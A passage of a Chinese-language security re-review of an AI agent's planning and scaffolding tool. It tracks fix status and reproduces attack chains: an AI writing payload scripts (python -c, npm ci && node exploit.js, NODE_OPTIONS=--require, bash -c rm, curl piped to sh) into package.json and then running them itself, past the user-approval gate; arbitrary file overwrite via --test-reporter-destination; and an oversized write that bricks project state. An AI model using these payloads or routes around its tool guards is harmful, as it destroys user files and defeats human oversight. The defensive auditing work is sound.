| **M6** | 低 | `checks.js` 的 `head` 置空；两处 `action=verify` 改成 `action=done（evidence.kind=check）` | **已闭合** |
| **L1 / L2** | 低 | `choose_build` 查重复卡 id / 重复 tech id | **已闭合**：`卡片 id 重复：c1——删掉重复的卡` |
| **L3** | 低 | `nextIdeaId` 撞号加 `_2` / `_3` 后缀 | **已闭合** |
| **L4** | 观察 | `project.readJson` 加 2 MB 上限 + `clarify answers` 加 32 KB 上限 + `scaffold` 加 1 MB 上限 | **部分闭合，且引入新故障**：`answers` 侧生效（33 KB 即拒）、`scaffold` 侧生效（但量的是**字符**不是字节：150 万 ASCII 拒，60 万中文 ≈1.8 MB 仍落盘）；**但写进 `state` 的其它字段没有对应上限**，单条就能把 `state.json` 顶过 2 MB 读上限 → **§9.4-N14（高）** |
| **L5** | 低 | 白名单移除 `README.md` / `index.html` | **已闭合**（白名单现在就是 7 个配置文件） |
| **L6** | 低 | `git.ARTIFACT_PATHS` 补 `VERIFY.md` | **已闭合**（`test/git.test.js` 断言同步） |
| **L7** | 低 | `clarify record` 也走 `autoCommit`，但**不**渲 `IDEA.md`（契约把 `IDEA.md` 挂在 `clarify_done` 上） | **已闭合**：实测产生 `plando(clarify): detail` 提交；且**不会**把用户 `git add` 过但未提交的文件带进提交（`git.js` 的 pathspec 收窄仍在生效） |
| **L8** | 观察 | `classifyTool` 前缀没命中时按**词元**兜底（按 `_` / `-` / 驼峰切开，任一词元命中就按对应能力处理） | **基本闭合**：`fs_write` / `mcp__filesystem__write_file` / `powershell` / `shell_exec` / `cmd` / `exec` / `spawn_teammate` 现在都拒；仍放行 `node` / `python` / `java` / `ruby` / `perl` / `php` / `deno` / `bun` / `git` / `tar` / `unzip` / `present` / `read` / `grep` / `todo_write`（见 §9.4-N18） |

**统计**：原报告的 18 条（G1–G4 / M1–M6 / L1–L8）里，**14 条真闭合**（G1 / G3 / G4 / M1 / M2 / M3 / M5 / M6 / L1 / L2 / L3 / L5 / L6 / L7），**3 条部分闭合**（G2 高危、M4 中危、L4 观察项——L4 修了一半还换来一个新的高危 N14），**1 条基本收窄**（L8：危险名字都归位了，但未知名仍 fail-open，见 N18）。

### 9.2 重跑结果：已关上（回归基线，可以照着守）

一条命令：

```powershell
node $env:TEMP\plando-review\probe-final37.mjs   # 本节的 A / B / C 三段全部来自它
```

| 项 | 重跑实测（HEAD `ab5f108`） |
|---|---|
| G1 `declare` 白名单 | **14/14** 攻击命令全拒；反向 5/5 合法命令（`npm test` / `npx vitest run` / `node --test` / `python -m pytest` / `cargo test`）仍放行 |
| G3 卡 id | **5/5** 非法 id 全拒，`.plando/cards/` 外无文件 |
| G4 `dir` | 已有 `IDEA.md` 的目录拒绝立项、用户文件未动；相对路径拒绝 |
| M1 渲染失败 | `stage` 不推进，日志不丢 |
| M2 拒绝留痕 | 3 次拒绝 → log **+3** 行，字段 `{at, kind:'reject', source:'tool', reason}` |
| M3 160 字 | 5 个工具全部 ≤160 |
| M5 契约 | `CONTRACT.md` §2 与 `policy.js` 文案一致（`ac84349`） |
| L6 | `ARTIFACT_PATHS = [IDEA.md, TECH.md, VERIFY.md, HANDOFF.md, CHANGE-GUIDE.md, .plando]` |
| L7 | `clarify record` 产生 1 个 commit，且**不含**用户已暂存的文件 |

这几条**现在都是有测试守着的**（`test/checks.test.js` 的 `validateCommand` 用例从 0 条涨到覆盖贴值 / 黏连 / 预加载 / 包管理器子命令；`test/review-state.test.js` 覆盖 id 与重复；`test/scaffold.test.js` 覆盖 1 MB 上限），不再只靠人肉复核。

### 9.3 第一轮复核（HEAD `ab5f108`）：G2 仍活着 —— 而且因为 `npm` 链路被同时修好，**端到端路径比修复前更短**

> **注意**：这一节记录的是 **`ab5f108` 那棵树**上的状态。看完这节之后 Lead 又做了一轮修复（在**未提交的工作树**里，见 §9.6），**G2 在那棵树上已经闭合**。保留这节是因为它记录了攻击链的完整形态，也是 §9.6 里「误杀」的由来。

`7faeddb` 顺手修了 Windows 上 `npm` 的 spawn 问题（改成找 `node_modules/npm/bin/npm-cli.js` 用 `node` 跑）。这个修复单独看是对的（`npm test` 现在真的能跑通），但它和 G2 的残留**叠在一起**后，攻击链从「AI 埋命令 → **用户自己敲** `npm test`」变成了「**AI 自己埋命令 → AI 自己敲**」。

端到端复现（`probe-final31.mjs`，全程 **4 次 `plando_*` 调用、用户零操作**）：

```
build 阶段，c1 是正常流程里的一张卡

① plando_scaffold { dir, path:'package.json', techId:'t1', content: JSON.stringify({
     name:'p', version:'1.0.0',
     scripts: { test: `python -X utf8 -c "open('AUTORUN.txt','w').write('AI 自己跑的')"` },
   }) }
   → 已写 package.json。            （scripts 的值只过 SCRIPT_VALUE_DENY 正则，`-X utf8` 把它顶开了）

② plando_card { action:'declare', dir, id:'c1', command:'npm test' }
   → 已为卡片 c1 声明检查命令：npm test    （npm test 在 ALLOWED_COMMANDS / PM_SAFE_VERBS 里，合法）

③ plando_check { action:'run', dir, name:'c1' }
   → · 检查 c1：通过｜退出码 0              （真的执行了）

④ plando_card { action:'done', dir, id:'c1', evidence:{kind:'check', summary:'跑了 npm test，退出码 0'} }
   → 卡片 c1 已 done。                      （这句证据此时是真的——但它是 AI 自己造出来的真）

之后 cards_done → ship_pass{explain:'检查都过了'} → stage = done
AUTORUN.txt 存在 = true
用户自己写的文件 = ["AUTORUN.txt", "IDEA.md", "TECH.md"]   ← 一个业务文件都没有
```

**这比 §8.5 写的版本严重。** §8.5 时这条链还需要用户配合敲 `npm test`；现在 `plando_check` 自己就能跑通，**「AI 不代写」的最后一道人肉闸门消失了**——`plando_check` 的设计前提是「执行用户已声明的检查」，但当 AI 能同时写 `package.json` 的 `scripts` 和声明 `npm test` 时，它自己就是那个「用户」。

`validateContent` 仍然放行的 `scripts` 值（逐条实测）：

| payload | `scaffold.validateContent` | `checks.validateCommand`（同一批） |
|---|---|---|
| `python -X utf8 -c "…"` | **放行** | 拒绝 |
| `python -u -c` / `python -I -c` / `py -3 -c` / `python3.12 -c` | **放行** | 拒绝 |
| `npm install evil-pkg` / `npm ci` / `npx evil-pkg` | **放行** | 拒绝 |
| `node evil.js` | **放行** | 放行（这是「跑一个文件」，`validateCommand` 也分不出来） |
| `bash -c "rm x"` | **放行** | 拒绝 |
| `npm ci && node exploit.js` / `true; node exploit.js` | **放行** | 拒绝（`&&` / `;` 被拒） |
| `NODE_OPTIONS=--require=./evil.cjs node --test` | **放行** | 拒绝（环境变量前缀被拒） |
| `tar czf - src.js` | **放行** | 拒绝（`tar` 不在白名单） |

**建议的修法（和 §8.4 同一条原则，只是这次要真的落到 `scaffold.js`）**：

1. `scripts` 的每个值直接 `checks.validateCommand(value)`——我实测同一批 payload 那边**除了 `node evil.js` 这一种形态，其余 7/7 全拒**，差距只在「命令名紧邻开关的正则」vs「遍历 argv 每个 token」；`node <文件>` 靠这条修法关不上，得靠下面第 2 条；
2. 再补一条兜底：`scripts` 的值**只能以 `ALLOWED_COMMANDS` 里的命令名开头**（允许 `cross-env` / `npm run x` 这类壳，其余一律拒），这样 `tar` / `make` / `./evil.sh` 也一起关掉；
3. 值里出现 `&&` `||` `;` `|` 反引号 `$(` 一律拒——现在这些**全部放行**（`npm ci && node exploit.js` 实测过关），它们是「一条命令串两条」的最短路径；
4. `scripts` 的值不允许含 `=` 开头的环境变量赋值（`NODE_OPTIONS=--require=…` 实测过关，它把 `node --test` 变成了加载任意模块）。

### 9.4 这批修复引入 / 未覆盖的新问题

#### N14　写侧没有与读侧对齐的规模上限 → **一次调用就能把项目写成「永久读不出来」**　【高】

`7faeddb` 加了两个上限：读侧 `project.MAX_JSON_BYTES = 2 MB`、写侧 `tools.MAX_ANSWER_BYTES = 32 KB`（只查 `clarify` 的 `answers`）。**这两条不对称**：`state.json` 里还有一堆字段完全不受 32 KB 约束，其中任何一个超过 2 MB，文件就再也读不回来了。

**复现（`probe-final37.mjs` C1，4 次调用）**：

```
① plando_project { action:'init', dir, name:'p' }                    → 已立项
② plando_clarify { action:'record', dir, kind:'detail',
     questions: ['q'.repeat(5 * 1024 * 1024)],        ← 只传 1 条，5 MB
     answers: { what: 'x' } }                          → 已记录（detail，第 1 轮）。
   state.json = 5.00 MB

③ plando_status { dir }
   → · 读不出项目状态：plando：项目状态 …\state.json 有 5121 KB，超过 2 MB 上限——先备份再人工检查，不要直接重置。
④ plando_project { action:'open', dir }   → 同一条错
   plando_project { action:'init', dir, name:'p' }
   → plando：…已有项目状态（阶段 未知）——用 plando_project action=open 打开它   ← 死循环
   plando_transition / plando_card / plando_clarify / plando_check   → 全部同一条错
```

**期望**：写侧就该拒绝——「这次要写进 `state.json` 的内容会让文件超过读上限」时返回 `plando：这一条有 5120 KB，超过 32 KB 上限——下一步：…`，和 `answers` 那条一模一样。
**实际**：写成功了（返回 `已记录`，看起来是成功），下一句话起项目永久读不出来；`plando_project` 只支持 `open` / `list` / `init`，**没有任何一个 action 能在 state 超限后自愈**，只能人工去改 `.plando/state.json`。
**为什么算新引入**：修复前 `state.json` 再大也只是「大文件」，`JSON.parse` 照样能读；是 2 MB 读上限把「大」变成了「读不出来」，而写侧没跟上。

**同一根因的其它入口（全部实测单独就能顶过 2 MB）**：

| 字段 | 一次调用 | 结果 |
|---|---|---|
| `clarify questions[0]` | 5 MB | state 5.00 MB → 读不出 |
| `card done evidence.summary` | 3 MB | `卡片 c1 已 done。` → state 3.00 MB → 读不出 |
| `tech_ok items[].title` | 2.5 MB | `已推进` → state 2.50 MB → 读不出 |
| `card downgrade reason` | 2.5 MB | 成功 → state 2.50 MB → 读不出 |
| `ship_pass explain` | 2.5 MB | `已推进：ship → done` → state 2.50 MB → **直接到 done 之后读不出** |

**建议**：
1. **写侧统一设卡**：在 `saveState`（或每个工具的写入口）序列化后比较字节数，超过 `MAX_JSON_BYTES` 的 80% 就拒，并报出是哪个字段太大——一处收口，六个入口一起关。注意 `MAX_CONTENT_CHARS` 走的是 `[...content].length`（**字符**），中文内容能写到 ~3 MB，改的时候一并按 `Buffer.byteLength` 口径统一；
2. 每个自由文本字段给各自的短上限（`evidence.summary` / `reason` / `explain` 200–500 字，`questions[]` 200 字，`title` 100 字），口径和 `state.js` 已有的 `checkDoneObservable` 的 200 字上限一致；
3. **给一条恢复通道**：`plando_project` 加 `action=repair`（把超限文件备份成 `state.json.bak.<时间戳>` 再重建最小骨架），或者至少在 `plando_status` 的恢复指引里写「也可以把 `.plando/state.json` 里那个超长字段删掉」——现在的指引只说「备份再人工检查」，没告诉人检查什么。

#### N15　合法命令被误杀：`--test-reporter=<内置名>` 全拒　【中】

`checks.js` 的 `INTERPRETER_DENY_FLAGS` 里有 `--test-reporter`，本意是挡 `--test-reporter=./evil.cjs`（加载任意模块）。但 Node 的**内置** reporter 是常见合法用法，现在一并被拒，而且给出的理由是错的：

```
validateCommand('node --test --test-reporter=spec')
→ 命令里的「--test-reporter=spec」会让检查变成执行任意代码，不允许
```

实测 `spec` / `tap` / `dot` / `junit` / `lcov` **5/5 全拒**。用户写了 `--test-reporter=spec` 想声明成检查，模型会被告知「这会执行任意代码」——**假警报比漏报更容易让人不信任整套校验**，而且它会促使模型自己改写命令来绕开校验。

**建议**：`--test-reporter` 的值在 `{spec, tap, dot, junit, lcov, github}` 里就放行（这些是 Node 内置的），含 `/` `\` `.js` 或以 `.` 开头的才拒；`--test-reporter-destination` 同理，只允许项目内的相对路径或直接拒（它是**写**文件，本来也不该出现在检查里）。

#### N16　`reject` 日志没有工具名、没有项目 `dir`　【低】

M2 修好之后所有拒绝都留痕了，但每行只有：

```json
{"at":"2026-11-25T13:26:36.345Z","kind":"reject","source":"tool","reason":"plando：卡片 nope 不存在——下一步：…"}
```

`source:"tool"` 是常量，**看不出是 `plando_card` 还是 `plando_scaffold` 拒的**；也没有 `dir`，多项目时无法区分是哪个项目被拒。`plando_transition` 那条 `{event, from}` 形状则是有上下文的——两条日志形状不一致。

**建议**：`run()` 里把工具名和 `dir` 一起写进去（`{at, kind:'reject', tool:'plando_card', dir, reason}`），并让 transition 那条也走同一个写入函数，形状统一。这样「这个模型被拒了几次、卡在哪」才真的可查——否则 M2 只解决了「有没有」，没解决「是谁」。

#### N17　`init` 成功消息可以 420 字　【低，观察】

M3 管的是**错误**文本的 160 字上限。但成功消息同样会把完整路径拼进去：`dir` 是 3 层、每层 120 字的深目录时，第一行 `已立项：p（<完整路径>）` 是 **420 字**。契约的 160 字条款只约束 `plando：…——下一步：…` 形状的错误，所以**这不算违约**；但它和 M3 同一个根因（长路径直接进文本），而且这一行在终端里会折成 3 行。**建议**：成功消息里的路径超过 ~80 字就只显示尾部两段（`…\bbb\ccc`），完整路径让用户 `plando_status` 里看。

#### N18　守卫的「词元兜底」仍是 fail-open　【观察】

L8 的修法方向对（词元命中就按能力处理），但**没命中时仍然放行**。实测仍放行：`node` / `python` / `python3` / `java` / `ruby` / `perl` / `php` / `deno` / `bun` / `git` / `tar` / `unzip` / `present` / `read` / `grep` / `todo_write` / `note_edit`。这些名字里没有任何一个词元命中四个危险能力，所以全部落到 `unknown` → 放行。

**当下不是绕过**（预设没挂这些名字的工具），但 `node` / `python` / `git` 这三个名字**在别的 DSH 版本里很可能就是一个 shell 工具的别名**。建议：把 `unknown` 从「放行」改成「放行 + 记一次日志」，或者反过来——维护一个「已知只读」白名单（`read` / `grep` / `glob` / `present` / `todo_write` / `note_edit` / `plando_*`），其余 fail-closed。后者更符合这个模式「宁可误伤也不放行」的取向。

### 9.5 第一轮修复后的优先级（`ab5f108` 那棵树）

> 这一节的排序在第二轮（§9.6.6）已经被改写——G2 与 N14 都关上了，腾出的位置被 N19 占上。**当前有效的优先级只看 §9.6.6。**

**判决没变（§6 仍是 fix-first），但待办从 2 条变成 3 条，且第一条更难绕**：

| 优先 | 项 | 一句话 | 修复成本 |
|---|---|---|---|
| 1 | **G2** | `scaffold` 的 `scripts` 值改调 `checks.validateCommand` + 只允许白名单命令名开头 + 拒 `&&`/`;`/`\|`/`` ` ``/`$(`/环境变量前缀。**这是唯一还活着的高危，而且现在不需要用户配合** | 小（一个函数调用 + 4 条规则） |
| 2 | **N14** | 写侧统一用 `MAX_JSON_BYTES` 兜底 + 各自由文本字段短上限 + 给一条 `action=repair` 恢复通道 | 小到中（一处收口） |
| 3 | **M4** | `evidence.kind='check'` 要接 `checks.json` 里最近一次 `run` 的真实 `exitCode`；`ship_pass.explain` 同样；全卡 downgrade 要求一句整体理由 | 中（要把 `run` 的结果落进 state） |

进 KNOWN-ISSUES 即可：N15 / N16 / N17 / N18、`--watch` / `--inspect-brk` 挂满 60s 超时、`deno run` / `bun run` 形态的放行。

**§9 的重跑命令**：

```powershell
node $env:TEMP\plando-review\probe-final37.mjs    # 本节 A（已关上）/ B（仍成立）/ C（新问题）三段
node $env:TEMP\plando-review\probe-final31.mjs    # G2 新链路：4 次调用、用户零操作 → stage=done + 命令真的执行了
node $env:TEMP\plando-review\probe-final23.mjs    # N14：questions 5MB → 项目读不出（每个 case 独立项目）
node $env:TEMP\plando-review\probe-final33.mjs    # N14：8 个 action 逐个试，没有一个能自愈
node $env:TEMP\plando-review\probe80.mjs          # N15：--test-reporter 内置名被误杀
```

*§9 的复核过程同样没有改动 `lib/` 与 `test/`；本节唯一改动是追加这段文字。*

---

### 9.6 第二轮：`76e37b8` 那棵树上的复核（G2 换了一种形态活下来，还带进来一个任意写）

> **这一节复核的是提交 `76e37b8`（「闭合 §9.3 G2 与新发现 N14–N17，补分发包冒烟」）。** §9.1–§9.5 描述的是它上一棵 `ab5f108`，两节的「现状」列不一致是正常的——本节更新。本节同样是复核证据，**不是新判决**；判决仍在 §6。

#### 9.6.1 这一轮真的修好了什么

| 项 | 修法 | 我的复测结果（脚本在 `%TEMP%\plando-review\`） |
|---|---|---|
| **G2**（§9.3 那批 payload） | 新增 `scaffold.validateScriptValue(key, value, validateCommand)`，四道：① 串联字符 `&&` `\|\|` `;` `\|` 反引号 `$(` 一律拒；② 环境变量前缀一律拒；③ 命令名必须在 `SCRIPT_COMMANDS` 里；④ 整条命令交给注入的 `checks.validateCommand` 做 argv 级校验 | **14/15 攻击形态被拒**（`probe-final46.mjs` A 段）：`python -X utf8 -c` / `python -u -c` / `py -3 -c` / `python3.12 -c` / `npm install <包>` / `npm ci` / `npx <包>` / `bash -c` / `npm ci && node x` / `true; node x` / `NODE_OPTIONS=…` / `tar` / `./evil.sh` / `node -e` / `curl … \| sh` 全拒。**§9.3 那条 4 次调用到 `done` 的链子断了** |
| **N14**（写侧没有与读侧对齐） | `project.saveState` 落盘前量字节数，超过读上限 80%（`MAX_WRITE_BYTES` ≈ 1.6 MB）就拒写，并用 `largestFields()` 指出最大的 3 个字段 | **已闭合**：`clarify questions` 5 MB / `card done evidence.summary` 3 MB / `tech_ok items[].title` 2.5 MB 三例**全部被拒**，`state.json` 停在 1–2 KB，**项目仍然可读**（`probe-final46.mjs` C 段）。§9.4 里「一次调用就把项目写成永久读不出来」这条不可逆故障没了 |
| **N15**（`--test-reporter` 误杀） | 从 `INTERPRETER_DENY_FLAGS` 移除，改成 `FLAGS_WITH_SAFE_VALUES` 白名单（`spec` / `tap` / `dot` / `junit` / `lcov` / `github`）+ `looksLikeModulePath()` | **误杀已修**：6 个内置名全放行，`--test-reporter=./evil.cjs` 仍拒（`probe80.mjs` / `probe-final46.mjs` D 段）。**但这个改动顺手打开了 N19**，见 §9.6.3 |
| **N16**（reject 日志缺字段） | `run(args, body, deps, toolName)` + `logRejection` 写入 `tool` 与 `dir` | **已闭合**：字段现在是 `["at","kind","source","tool","dir","reason"]`，能看出是哪个工具、哪个项目被拒（`probe-final46.mjs` E 段） |
| **N17**（`init` 成功消息过长） | `shortPath(dir)`：超过 60 字只留尾部两段 | **改善，未闭合**：420 字 → **250 字**（3 层 ×120 字深目录，`probe-final51.mjs`）。仍超 160，但 160 那条只约束错误文本，算观察项 |

#### 9.6.2 这一轮的代价：合法 `scripts` 被误杀 9/22

`SCRIPT_COMMANDS` 是一份**新写的白名单**，和 `checks.ALLOWED_COMMANDS` **不是同一份**。两处一漂移，就出现「同一个命令能过 `plando_check` 的校验，却写不进 `package.json` 的 `scripts`」——而 `scripts` 恰恰是真实项目里最常见的地方。

实测（`probe-final46.mjs` B 段，真 `plando_scaffold` 调用、真看文件落不落盘）：

| `scripts` 值 | 结果 | 说明 |
|---|---|---|
| `npm test` / `node --test` / `vitest run` / `tsc -b` / `tsc --noEmit` / `eslint .` / `prettier --write .` / `jest` / `pytest -q` / `python -m pytest` / `cargo test` / `npx vite build` / `npm run build` | **放行** | ✅ 「跑测试」这一类覆盖到了 |
| **`vite build`** | **拒绝** | `SCRIPT_COMMANDS` **有** `vite`，`checks.ALLOWED_COMMANDS` **没有** → 被第 ④ 层拒掉。**这是两份白名单不一致的直接证据** |
| **`next build`** / **`react-scripts build`** / **`webpack --mode production`** / **`rollup -c`** / **`esbuild …`** / **`nodemon …`** / **`pm2 start …`** | **拒绝** | 不在 `SCRIPT_COMMANDS` 里 |
| **`cross-env NODE_ENV=production vite build`** | **拒绝** | 以环境变量赋值开头 → 被规则 ② 拒。**但这恰好是 Windows / 跨平台 build 的标准写法** |
| **`rimraf dist && vite build`** | **拒绝** | 含 `&&` → 被规则 ① 拒。**这也是极常见的 build 写法** |

**代价是实打实的**：这个模式的自我定位是「帮你搭项目脚手架」，但**一个 Vite / Next.js / CRA 项目的标准 `package.json` 它写不了**——AI 只能写 `scripts.build = "npm run build"` 这种自我指涉的东西，或者干脆放弃写 `scripts`。用户看到的现象是「这个模式连 `package.json` 都不会写」。

**更麻烦的是错误文案会误导模型往绕路上走**（`probe-final40.mjs` 取到的原文）：

```
scripts.test = "vite build"  →  「vite」不在允许的检查命令里
                               （只认 node / npm / pnpm / python / cargo 这类构建与测试工具）
```

`vite` 明明就是个构建工具。而且**同一件事两种写法一拒一放**：`vite build` 拒、`npx vite build` 放——模型试两次就会学到「加个 `npx` 前缀就过了」，这等于**把白名单教成了一道可以试错的谜题**。

**建议（都不降低安全性）**：

1. **单一事实来源**：`SCRIPT_COMMANDS` 直接由 `checks.ALLOWED_COMMANDS` 派生，或至少加一条测试断言「`SCRIPT_COMMANDS` 的每一项都必须在 `ALLOWED_COMMANDS` 里」。现在没有这条测试，所以 `vite` 的漂移没人发现；
2. **放行已知的构建 / 开发工具名**（`vite` `next` `react-scripts` `webpack` `rollup` `esbuild` `parcel` `nodemon` `pm2` `tsx` `ts-node` `serve`）：它们都是「跑用户已经装好的依赖」，风险和 `vitest` / `jest` 同级；
3. **放行「友好壳」前缀**（`cross-env` `dotenv` `env-cmd` `rimraf` `shx`）：它们本身不执行任意代码，允许出现在第一个 token，**但第二个 token 起仍要过 `validateCommand`**；
4. **`&&` 规则分档**：只拒「右侧不是白名单命令」的串联，而不是见到 `&&` 就拒——现在的实现误伤面太大。

#### 9.6.3 N19　`--test-reporter-destination` 变成**任意路径写入**，一条命令能覆盖用户任何文件　【高，本轮新引入】

N15 的修法把 `--test-reporter-destination` **从 `INTERPRETER_DENY_FLAGS` 里整条删掉**了（只给 `--test-reporter` 加了值白名单）。但这个开关的语义是「**把测试报告写到这个路径**」——它是一个**写文件**能力，路径完全由命令串决定；`spawnSync` 的 `cwd` 设在项目根也拦不住 `..` 和绝对路径。

**端到端复现（`probe-final45.mjs`，两次 `plando_*` 调用，用户零操作）**：

```
① 用户在项目外有一份文件：C:\Users\me\Documents\NOTES.md（61 字节，含「不能丢」）

② plando_card { action:'declare', dir, id:'c1',
     command: 'node --test --test-reporter=spec --test-reporter-destination=C:\\Users\\me\\Documents\\NOTES.md' }
   → 已为卡片 c1 声明检查命令：…        （declare 校验通过）

③ plando_check { action:'run', dir, name:'c1' }
   → · 检查 c1：通过｜退出码 0

④ NOTES.md 现在 144 字节：
   "✔ 用户的测试 (0.7ms)\nℹ tests 1\nℹ suites 0\nℹ pass 1\n…"
   含「不能丢」= false                  ← 用户的文件被整份覆盖，原文不可恢复
```

三种路径形态**全部**实测可写（`probe-final50.mjs`）：

| 形态 | declare | run | 写到项目外 |
|---|---|---|---|
| 绝对路径 `C:\…\abs-target.txt` | 放行 | 通过 | **是**（项目外 2 层） |
| 相对路径 `../rel-target.txt` | 放行 | 通过 | **是**（项目外 1 层） |
| 相对路径 `../../rel2-target.txt` | 放行 | 通过 | **是**（项目外 2 层） |

**还能干更坏的事**：把目标指向 `.plando\state.json` 自己（`probe-final45.mjs` ③）——

```
plando_card declare 'node --test --test-reporter=spec --test-reporter-destination=<dir>\.plando\state.json'
plando_check run  → · 检查 c1：通过｜退出码 0
→ state.json 现在还像 JSON 吗 = false     ← 项目状态被测试报告覆盖
→ 项目现在可读吗 = false                  ← 项目变砖
```

这条比 N14 更狠：N14 至少还被写侧上限挡着（拒写、原状态可读），**这条是直接覆盖一个已经存在的文件，而且根本不经过 `saveState`，写侧上限管不到**。它还和 `plando_check` 的设计意图完全无关——检查本该只读。

**为什么算「本轮新引入」**：`ab5f108` 那棵树上 `--test-reporter-destination` 在 `INTERPRETER_DENY_FLAGS` 里，一条 `node --test --test-reporter-destination=…` 在 `declare` 阶段就被拒；把它和 `--test-reporter` 一起放开才出现的。N15 的误杀只针对「`--test-reporter=<内置名>`」，这两个开关语义完全不同，**不该一起放**。

**修法（建议两条都做）**：

1. **把 `--test-reporter-destination` 重新加回 `INTERPRETER_DENY_FLAGS`**。它是「写文件」，不属于「跑检查」，没有正当理由出现在检查命令里；
2. 如果要支持，则值必须**解析后落在 `dir` 内**（`path.resolve(cwd, value)` 以 `path.resolve(dir)` 开头），且不许命中 `.plando/`。但这要求 `validateCommand` 拿到 `dir`——目前签名只有 `command`，**改造成本比直接拒高得多**。

**同一类风险值得顺手排查一遍**（`probe-final52.mjs`，全部**当前放行**）：

| 开关 | 放行 | 说明 |
|---|---|---|
| `--test-reporter-destination=<任意路径>` | 是 | 本节的 N19 |
| `--report-directory` / `--report-filename` / `--report-on-fatalerror` | 是 | 诊断报告，写到任意目录 |
| `--cpu-prof-dir` / `--heap-prof-dir` / `--diagnostic-dir` | 是 | 同样是任意目录 |
| `--redirect-warnings=<任意路径>` | 是 | 直接写文件 |
| `--snapshot-blob` / `--build-snapshot` | 是 | 写 / 读快照二进制 |
| `--env-file` / `--env-file-if-exists` | 是 | 读任意环境文件（读侧） |
| `cargo clean` / `go clean -cache` | 是 | 删构建产物（破坏性，但不是任意路径） |

**这不是「一条漏网之鱼」，是一整类**。建议在 `INTERPRETER_DENY_FLAGS` 之外单列一个 `PATH_FLAGS`，规则是「值必须落在 `dir` 内」或干脆全拒；至少 `--test-reporter-destination` 与 `--redirect-warnings` 应该立刻拒。

#### 9.6.4 `node evil.js`：唯一剩下的 G2 开口，但风险已被 G1 抵消

`scripts.test = 'node evil.js'` 仍然放行（`probe-final46.mjs` A 段）。看上去是「AI 埋一条 `node evil.js`」，但要真被执行，`evil.js` 必须**已经在项目里**——而 AI 写不出 `.js`（`scaffold` 白名单只有 7 个配置文件，`.js` 一律拒），`plando_check` 也不能写文件。

所以残余风险是：**用户项目里本来就有那个 `evil.js`**（或 AI 之前通过别的渠道留下的），AI 能把它挂到 `npm test` 上。这比 §9.3 的 `python -X utf8 -c` 弱得多，**可以进 KNOWN-ISSUES**——但前提是先修 N19，否则没有意义（N19 是更强的任意写）。

#### 9.6.5 M4：`76e37b8` 上仍原样（**在途修复见 §9.6.7**）

`probe-final46.mjs` F 段：

- `evidence {kind:'check', summary:'我懂了'}` → 拒
- `'跑了一下'` / `'everything works'` / `'跑了 vite build，退出码 0'` → **全部通过**
- 全卡 `downgrade` → `cards_done` → `ship_pass{explain:'好了'}` → `stage=done`，项目里只有 `IDEA.md` + `TECH.md`，没有 `checks.json`

和 §9.1 里记的状态一致：**这是从头到尾唯一一条一轮都没被碰过的中危。** `§10` 里 Lead 也把它记成了「部分闭合，本轮不做」。

#### 9.6.6 第二轮（`76e37b8`）的净结果

> ⚠ **这一段的「仍开」列表已被 §9.6.7 / §9.6.8 更新**：N19 与误杀在 §9.6.8 里都关上了，M4 的 `kind:'check'` 在 §9.6.7 里修好。保留这段是因为它记录了「修完一轮之后净变化是什么」的当时判断。**要看现状看 §9.6.8 末尾。**

| 项 | 对比 §9.1 的变化 |
|---|---|
| G1 / G3 / G4 / M1 / M2 / M3 / M5 / M6 / L1 / L2 / L3 / L5 / L6 / L7 | 保持闭合，无回归 |
| **G2** | **攻击面基本闭合**（14/15）。但换来 ① 误杀 9/22 常见 build 写法、② 两份白名单漂移、③ `node evil.js` 仍开 → **从「高」降到「中 + 体验问题」** |
| **N14** | **已闭合**（写侧 80% 上限 + 指出大字段）。§9.4 里最不可逆的那条没了 |
| **N15** | 误杀已修，**但引入 N19（高）** |
| **N19（新）** | **任意路径写入 / 覆盖用户文件 / 覆盖 `state.json` 让项目变砖**。两次 `plando_*` 调用，端到端复现见 §9.6.3 |
| **N16** | **已闭合**（日志带 `tool` + `dir`） |
| **N17** | 改善（420 → 250 字），观察项 |
| **N18** | 未动（Lead 的决定是「不改，把前提写成断言」，已记在 §10） |
| **M4** | `76e37b8` 上未动；**在途修复已让 `kind:'check'` 对账生效**（见 §9.6.7），但 `kind:'files'` / 全卡 downgrade / downgrade reason 三个口子仍开 → **部分闭合** |

**净结果一句话**：G2 的洞被堵上了，N14 也真修好了，**但腾出来的位置立刻被 N19 占上**——一个能覆盖用户任意文件、还能把 `state.json` 覆盖成非 JSON 的写能力，而且它是由「修 N15 误杀」这个纯体验修复顺带放出来的。**判决仍然是 fix-first**（§6 不变），只是待办换了：

| 优先 | 项 | 一句话 |
|---|---|---|
| 1 | **N19** | `--test-reporter-destination`（以及 `--redirect-warnings` / `--*-dir` / `--snapshot-blob`）加回拒绝列表，或值必须在 `dir` 内。**这是现在唯一的「任意文件写」** |
| 2 | **G2 的代价** | `SCRIPT_COMMANDS` 由 `ALLOWED_COMMANDS` 派生 + 加漂移断言 + 放行 `vite` / `next` / `webpack` 这类构建工具 + `cross-env` / `rimraf` 壳 + `&&` 分档。**这条不修，脚手架功能的实际可用性会明显偏低** |
| 3 | **M4 的剩余三口** | `kind:'files'` 验路径存在 / 全卡 downgrade 不许零产出到 done / `downgrade.reason` 复用 `checkEvidenceObservable`（`kind:'check'` 的对账已在 §9.6.7 修好，不再是「一直没动过」） |

进 KNOWN-ISSUES：`node evil.js`、N17（250 字）、N18（未知名 fail-open，已由 `test/preset.test.js` 的断言兜住前提）、`--watch` / `--inspect-brk` 挂满 60s 超时、`deno run` / `bun run` 形态放行、`cargo clean` / `go clean` 放行。

---

#### 9.6.7 在途复核：M4 的修复（工作树，尚未提交）

复核 §9.6 的过程中工作树又被改了：`lib/cards.js` 的 `doneCard` 多收一个 `options.lastCheck`，`kind:'check'` 的证据要和 `.plando/checks.json` 里**最近一次真实执行记录**对账。我对着这棵在途树重跑了 M4（`probe-final53.mjs` / `probe-final54.mjs` / `probe-final55.mjs`，`node --test` 368 全绿）。

**已经修好的部分（这是 M4 第一次被真正修）**：

| 场景 | 修复前 | 现在 |
|---|---|---|
| 没跑过检查就说「跑了 vite build，退出码 0」 | 通过 | **拒绝**：「卡片 c1 说跑了检查，但 `.plando/` 里没有任何执行记录」 |
| 没跑过检查说「跑了一下」/「everything works」 | 通过 | **拒绝**（同上） |
| 检查**真的跑失败**了（退出码 1），再声称「跑了」 | 通过 | **拒绝**：「卡片 c1 的检查上次没通过（退出码 1）」 |
| 真的跑过且退出码 0，再收尾 | 通过 | **通过**（正常路径没被误伤） |
| 拿**别的卡**的检查记录来给本卡收尾 | 通过 | **拒绝**：「最近一次检查是「c2」的，不是这张卡（c1）的」 |

